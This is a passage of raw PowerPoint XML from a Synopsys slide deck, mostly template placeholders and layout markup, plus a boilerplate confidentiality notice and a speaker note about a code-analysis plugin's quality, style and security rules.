              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The plugin mostly contains quality and style</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> rules, but it does have a few security rules, or rules that may lead to discovering security problems in the code.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{ED9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>34</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1243897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9278AC-E332-4142-AA14-60688B5140C5}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>35</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2717765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3.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jpg"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="../slideMasters/slideMaster1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag13.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18.xml"/><Relationship Id="rId7"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4.jpe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5.jpe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1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag51.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag50.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1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag55.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Master" Target="../slideMasters/slideMaster1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag60.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag59.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Master" Target="../slideMasters/slideMaster1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag65.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag64.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Master" Target="../slideMasters/slideMaster1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag70.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag6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74.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tags" Target="../tags/tag7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9459FA-0BBD-4C23-967C-7DDC65B7AD38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7"/>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0233358" y="485435"/>
            <a:ext cx="1653211" cy="529027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1895641"/>
            <a:ext cx="10972800" cy="1177506"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr sz="3600" baseline="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId4"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3094852"/>
            <a:ext cx="10963923" cy="917516"/>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a Subtitle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3394608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lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1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4023015"/>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3">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ynopsys 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44057EF-F0C7-4197-82D0-267908AF3CF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Picture 11"/>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0233358" y="485435"/>
            <a:ext cx="1653211" cy="529027"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text Placeholder 15"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="4108495"/>
            <a:ext cx="10962523" cy="731520"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="l">
              <a:buNone/>
              <a:defRPr sz="20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dirty="0"/>
              <a:t>Presenter’s Name</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text Placeholder 18"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="11" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId4"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="4861720"/>
            <a:ext cx="4876800" cy="396815"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:buNone/>
              <a:defRPr sz="1800">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Date</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId5"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3094851"/>
            <a:ext cx="10963923" cy="917516"/>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a Subtitle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId6"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1895641"/>
            <a:ext cx="10972800" cy="1177506"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr sz="3600">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2538705328"/>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609600" y="609601"/>
            <a:ext cx="10972800" cy="452596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lang="en-US" b="1" dirty="0"/>
              <a:t>CONFIDENTIAL INFORMATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The following material is confidential information of Synopsys and is being disclosed to you pursuant to a non-disclosure agreement between you or your employer and Synopsys. The material being disclosed may only be used as permitted under such non-disclosure agreement. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IMPORTANT NOTICE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In the event information in this presentation reflects Synopsys’ future plans, such plans are as of the date of this presentation and are subject to change. Synopsys is not obligated to develop the products with the features and functionality discussed in these materials. In any event, Synopsys’ products may be offered and purchased only pursuant to an authorized quote and purchase order or a mutually agreed upon written contract. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27207422"/>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3945">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" orient="horz" pos="372">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609600" y="68574"/>
            <a:ext cx="11582400" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414463"/>
            <a:ext cx="10972800" cy="4848225"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr baseline="0"/>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:defRPr/>
            </a:lvl3pPr>
            <a:lvl4pPr>
              <a:defRPr/>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:defRPr/>
            </a:lvl5pPr>
            <a:lvl6pPr>
              <a:defRPr/>
            </a:lvl6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2" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>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3348340793"/>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7">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="52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48F746-CEB3-4F47-8DCC-9A7E1FDEAD0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="invGray">
          <a:xfrm>
            <a:off x="-9" y="1215389"/>
            <a:ext cx="12192357" cy="1295438"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1295400"/>
            <a:ext cx="11582400" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                    <a:srgbClr val="000000">
                      <a:alpha val="43137"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1524000" y="2688610"/>
            <a:ext cx="10058400" cy="3559791"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:spcBef>
                <a:spcPts val="1867"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr baseline="0"/>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl3pPr>
            <a:lvl4pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl5pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to add agenda topics --- no bullets here</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1191274175"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:extLst mod="1">
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="1" orient="horz" pos="1693">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="960">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="3" pos="7296">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" orient="horz" pos="3945">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D20E43-B3EE-4B3C-8232-551DC61A70ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="invGray">
          <a:xfrm>
            <a:off x="-1" y="2021760"/>
            <a:ext cx="12192005" cy="2540001"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609601" y="2010333"/>
            <a:ext cx="10384465" cy="1253863"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="3400">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                    <a:srgbClr val="000000">
                      <a:alpha val="43137"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title – Transition Slide</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609601" y="3430818"/>
            <a:ext cx="10384465" cy="1119515"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="2400" i="1">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67723627"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:extLst mod="1">
    <p:ext uri="{DCECCB84-F9BA-43D5-87BE-67443E8EF086}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="1" pos="384">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="6936">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Subtitle">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dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="1" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414463"/>
            <a:ext cx="5384800" cy="4848225"/>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custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6197600" y="1414463"/>
            <a:ext cx="5384800" cy="4848225"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
            <a:lvl2pPr>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr>
              <a:defRPr/>
            </a:lvl3pPr>
            <a:lvl4pPr>
              <a:defRPr baseline="0"/>
            </a:lvl4pPr>
            <a:lvl5pPr>
              <a:defRPr baseline="0"/>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custDataLst>
              <p:tags r:id="rId4"/>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1056088924"/>
      </p:ext>
    </p:extLst>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5">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="52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98766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611312"/>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3945">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" orient="horz" pos="37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ntent Subtitle">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endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="11" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414730"/>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2" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6197600" y="1414730"/>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p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId4"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="3965268"/>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14" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId5"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6197600" y="3965268"/>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6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="15" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId6"/>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1680194587"/>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4003">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="52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Gray Bar">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0" y="1311214"/>
            <a:ext cx="12192000" cy="5093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609600" y="68332"/>
            <a:ext cx="11582400" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1417319"/>
            <a:ext cx="10972800" cy="4846320"/>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custDataLst>
              <p:tags r:id="rId4"/>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1276138479"/>
      </p:ext>
    </p:extLst>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5">
          <p15:clr>
            <a:srgbClr val="5ACBF0"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="52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Gray">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="0" y="1311214"/>
            <a:ext cx="12192000" cy="5093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custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to Add a Title</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="1" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1417320"/>
            <a:ext cx="5384800" cy="4846320"/>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custDataLst>
              <p:tags r:id="rId4"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6197600" y="1417320"/>
